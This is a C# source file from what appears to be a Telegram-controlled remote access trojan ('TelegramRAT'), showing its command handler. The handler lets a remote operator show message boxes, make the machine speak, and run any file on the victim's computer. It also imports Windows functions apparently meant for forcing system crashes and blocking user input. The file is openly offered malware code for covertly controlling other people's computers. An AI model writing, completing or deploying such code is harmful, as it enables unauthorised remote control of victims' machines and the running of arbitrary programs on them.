using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Windows.Forms;
using SimpleJSON;
using Microsoft.Win32;
using System.Speech.Synthesis;

namespace TelegramRAT
{
    internal sealed class commands
    {
        // Import dll'ls
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString,
                            int uReturnLength, int hwndCallback);
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("User32", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uiAction, int uiParam, string pvParam, uint fWinIni);

        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

        //Command Handling Method
        #region Basic
        /*
        case "":
        Console.WriteLine("Test Command!");
            break;
                */
        #endregion


        // Commands handler
        public static void handle(string command)
        {
            Console.WriteLine("[~] Handling command " + command);
            string[] args = command.Split(' ');
            args[0] = args[0].Remove(0, 1).ToUpper();

            string text;
            string text1;
            string text2;
            string text3;
            string text4;
            string text5;
            string text6;


            // Handle commands
            switch (args[0])
            {

                #region MessageBox
                case "MESSAGEBOX":
                    {

                        try
                        {
                            text2 = args[1];
                            text = args[2];
                        }
                        catch (IndexOutOfRangeException)
                        {
                            telegram.sendText("⛔ Arguments <type>, <text> is required for /MessageBox");
                            break;
                        }
                        args[1] = "";
                        text = string.Join(" ", args, 1, args.Length - 1);
                        // info, error, warn, exclamination, question.
                        MessageBoxIcon icon;
                        if (text2 == "error")
                            icon = MessageBoxIcon.Error;
                        else if (text2 == "warning")
                            icon = MessageBoxIcon.Warning;
                        else if (text2 == "exclamination")
                            icon = MessageBoxIcon.Exclamation;
                        else if (text2 == "question")
                            icon = MessageBoxIcon.Question;
                        else
                            icon = MessageBoxIcon.Information;
                        // Show
                        telegram.sendText($"📢 Done!");
                        MessageBox.Show(new Form() { TopMost = true }, text, text2.ToUpper(), MessageBoxButtons.YesNoCancel, icon);

                        break;
                    }
                #endregion

                #region Speak
                case "SPEAK":

                    
                    try
                    {
                        text = args[1];
                    }

                    catch (IndexOutOfRangeException)
                    {
                        telegram.sendText("⛔ Arguments <text> is required for /Speak");
                        break;
                    }

                    SpeechSynthesizer synth = new SpeechSynthesizer();
                    synth.SetOutputToDefaultAudioDevice();
                    synth.Speak(text);



                    break;
                #endregion

                #region Execute File

                case "EXECUTEFILE":

                    try
                    {
                        text = args[1];

                        Process.Start(text);

                    }
                    catch
                    {
                        telegram.sendText("⛔ Arguments <File Path> is required for /EXECUTEFILE");
                    }
                    break;

                #endregion







                // Unknown command
                default:
                    {
                        telegram.sendText("📡 Unknown command");
                        break;
                    }
                    

            }
        }


    }
}
